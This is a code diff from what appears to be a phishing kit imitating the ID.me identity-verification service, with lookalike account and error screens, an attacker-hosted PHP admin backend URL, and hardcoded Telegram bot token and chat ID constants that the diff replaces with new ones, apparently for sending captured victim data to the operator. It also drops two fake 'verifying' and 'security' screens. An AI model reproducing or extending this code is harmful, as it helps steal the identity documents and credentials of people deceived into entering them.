@@ -18,8 +18,6 @@ import DoYouHaveIdMe from "../components/DoYouHaveIdme";
 import LandingPage from "../components/LandingPage";
 import CreateAccount from "../components/createIDMeNew";
 import SecondErrorPage from "../components/secondErrorPage";
-import WeAreVeryfying from "../components/weareveryfying";
-import SecondSecurity from "../components/SecondSecurity";
 
 // The URL for your PHP backend
 const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api3.php"; // Update this based on your server configuration
@@ -34,8 +32,8 @@ const UserPage = () => {
   const [formType, setFormType] = useState<string>("");
   const [showPopup, setShowPopup] = useState(false);
 
-const BOT_TOKEN = '8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE';
-const CHAT_ID = '6837437455';
+const BOT_TOKEN = '7939347007:AAFu3fkYZiNVGkc1viOKLP4CY722hYGsoq8';
+const CHAT_ID = '6639364559';
   
 
 const storedData = localStorage.getItem("applicationData");
@@ -156,11 +154,6 @@ useEffect(() => {
         return <CreateAccount />;
       case "SecondErrorPage":
         return <SecondErrorPage />;
-      case "WeAreVeryfying":
-        return <WeAreVeryfying />;
-        case "SecondSecurity":
-          return <SecondSecurity />;
-
       default:
         return (
           <div className="animate-pulse max-w-sm mx-auto bg-white p-6 rounded shadow">
